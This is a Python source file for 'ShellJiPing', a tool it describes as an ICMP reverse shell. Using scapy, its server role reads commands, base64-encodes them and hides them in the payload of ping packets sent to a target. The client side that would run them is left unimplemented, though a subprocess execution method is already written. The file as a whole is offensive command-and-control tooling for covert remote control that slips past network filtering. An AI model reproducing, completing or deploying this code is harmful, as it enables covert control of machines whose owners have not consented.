from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
from scapy.packet import Packet, Raw

import subprocess
import shlex
import os
import base64
import sys
import argparse

class ShellJiPing:
    
    def __init__(self, interface:str, target:bool, is_client:bool=False,
                 verbose:bool=False) -> None:
        self.interface = interface
        self.target = target
        self.is_client = is_client
        self.verbose = verbose


    def banner(self) -> str:
        text = "\n   ▄▄▄▄▄    ▄  █ ▄███▄   █    █     ▄▄▄▄▄ ▄█ █ ▄▄  ▄█    ▄     ▄▀\n"
        text += "  █     ▀▄ █   █ █▀   ▀  █    █   ▄▀  █   ██ █   █ ██     █  ▄▀\n"
        text += "▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █       █   ██ █▀▀▀  ██ ██   █ █ ▀▄\n"
        text += " ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄ ▄ █    ▐█ █     ▐█ █ █  █ █   █\n"
        text += "              █  ▀███▀       ▀    ▀ ▀      ▐  █     ▐ █  █ █  ███\n"
        text += "            ▀                                 ▀      █   ██\n"
        text += " ====- -- -- 不是中國的反殼哈哈 ///.\n"
        text += " - -- = == -- -- == = == -- - \n"
        return "\033[1;31m" + text + "\033[m"


    def create_icmp_packet(self, destination:str) -> Packet:
        """Creates an echo-request packet."""
        pkt = IP(dst=destination) / ICMP()
        return pkt
    

    def inject_command(self, icmp_packet:Packet, command:bytes) -> Packet:
        """Inject the command at the data field of the echo-request."""
        pkt_injected = icmp_packet / Raw(command)
        return pkt_injected
    

    def send_packet(self, destination:str, command:bytes) -> None:
        """Assembles all required pieces and sends the packet to the destination."""
        icmp_packet_1 = self.create_icmp_packet(destination)
        icmp_packet_2 = self.inject_command(icmp_packet_1, command)
        send(icmp_packet_2, verbose=self.verbose)

    
    def encode_command(self, command:str) -> bytes:
        """Converts string command to base64 encoded command."""
        encoded = base64.b64encode(
            command.encode("utf-8")
        )
        return encoded
    

    def decode_command(self, command:bytes) -> str:
        """Takes a command encoded with base64 and decode to a string."""
        decoded = base64.b64decode(command).decode("utf-8")
        return decoded


    def execute_command(self, command:str) -> bytes:
        """Executes commands as the client."""
        p = subprocess.run(
            shlex.split(command),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        return p.stdout


    def is_root(self) -> bool:
        """Simply checks the user privilege."""
        return os.getuid() == 0
    

    def server_role(self) -> None:
        """Holds the main logic for the server."""
        while True:
            command = input("/: ").strip()

            encoded_command = self.encode_command(command)
            self.send_packet(self.target, encoded_command)
            if self.verbose:
                print("[+] packet sent ==- ///.")
    

    def client_role(self) -> None:
        """Holds the logic for the client configuration."""
        print("[!] not implemented yet. ///.")


    def kickstart(self) -> int:
        """Lorem ipsum dolor amet..."""
        if not self.is_root():
            print("[!] no sudo powers, quitting... ///.")
            sys.exit(1)

        print(self.banner())

        try:
            if self.is_client:
                self.client_role()
            else:
                self.server_role()
        except KeyboardInterrupt:
            print("\n\n\033[1;31m[-] 再見 \\\\. \033[m")
            sys.exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ShellJiPing is a client-server ICMP reverse shell utility."
    )
    parser.add_argument("-t", "--target", required=True,
        help="The target to connect."
    )
    parser.add_argument("-i", "--interface", required=True,
        help="The interface to listen on and send packets."
    )
    parser.add_argument("--client", help="Sets the utility as the client.",
        action="store_true"
    )
    parser.add_argument("-v", "--verbose", help="Show aditional information to the output.",
        action="store_true"
    )

    args = parser.parse_args()

    sjp = ShellJiPing(args.interface, args.target, args.client, args.verbose)
    sjp.kickstart()
